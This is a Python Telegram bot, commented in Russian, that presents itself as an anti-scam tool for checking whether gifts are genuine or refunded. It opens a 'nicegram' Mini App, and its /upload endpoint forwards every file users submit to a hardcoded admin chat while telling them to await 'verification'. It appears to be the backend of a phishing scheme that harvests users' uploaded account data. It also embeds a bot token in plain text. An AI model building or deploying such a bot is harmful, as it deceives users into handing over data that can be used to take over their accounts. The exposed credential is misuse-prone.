import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile

# --- КОНФИГУРАЦИЯ ---
# ВАЖНО: Никогда не показывайте токен никому. Если вы его случайно "слили", лучше пересоздайте в BotFather.
BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
ADMIN_ID = 8187498719
WEB_APP_URL = "https://kareli123.github.io/nicegram/" 

# --- НАСТРОЙКИ СЕРВЕРА ---
WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- ВЕБ-СЕРВЕР ---
routes = web.RouteTableDef()

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    reader = await request.multipart()
    
    user_id = None
    file_data = None
    filename = "unknown.json"

    # Исправленный цикл чтения данных
    async for field in reader:
        if field.name == 'user_id':
            val = await field.read_chunk()
            user_id = val.decode('utf-8')
        elif field.name == 'file':
            filename = field.filename or "data.json"
            # Читаем файл целиком (для небольших файлов ок)
            file_data = await field.read()

    if user_id and file_data:
        try:
            # 1. Отправка админу
            await bot.send_document(
                chat_id=ADMIN_ID,
                document=BufferedInputFile(file_data, filename=filename),
                caption=f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
            )
            logging.info(f"Файл от {user_id} отправлен админу.")

            # 2. Ответ пользователю (если бот не заблокирован)
            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл принят. Ожидайте проверки.")
            except Exception as e:
                logging.warning(f"Не удалось ответить юзеру {user_id}: {e}")

        except Exception as e:
            logging.error(f"Ошибка при обработке файла: {e}")
            return web.Response(text="Error processing", status=500)

    # CORS заголовки
    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
    })

@routes.options('/upload')
async def handle_options(request):
    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# --- БОТ ---

# ИСПРАВЛЕНИЕ: Используем тройные кавычки для многострочного текста
TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников. 
Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги."""

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))]
    ])

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверка наличия картинки, чтобы бот не падал, если её нет
    if os.path.exists("nicegramm.jpg"):
        try:
            photo = FSInputFile("nicegramm.jpg")
            await message.answer_photo(photo=photo, caption=TEXT_MAIN, reply_markup=get_main_keyboard())
        except Exception as e:
            logging.error(f"Ошибка отправки фото: {e}")
            await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
    else:
        # Если картинки нет, просто шлем текст
        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())

# --- ЗАПУСК ---
async def main():
    # 1. Настройка веб-сервера
    app = web.Application()
    app.add_routes(routes)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
    
    # Запускаем сервер в фоне
    await site.start()
    logging.info(f"🌍 Server running on {WEB_SERVER_HOST}:{WEB_SERVER_PORT}")

    # 2. Запуск поллинга бота
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped!")
